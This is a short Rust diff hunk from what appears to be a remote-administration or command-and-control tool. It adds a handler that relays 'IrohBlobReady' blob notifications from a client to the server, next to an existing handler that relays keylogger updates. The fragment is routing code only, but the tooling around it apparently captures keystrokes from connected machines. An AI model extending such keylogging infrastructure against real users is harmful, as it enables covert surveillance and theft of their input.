@@ -267,6 +267,11 @@ impl ClientReaderWrapper {
                     .await;
             }
 
+            IrohBlobReady(blob_info) => {
+                self.send_server_packet(ServerCommand::IrohBlobReady(self.addr, blob_info))
+                    .await;
+            }
+
             KeyloggerUpdate(update) => {
                 self.send_server_packet(ServerCommand::KeyloggerUpdate(self.addr, update))
                     .await;
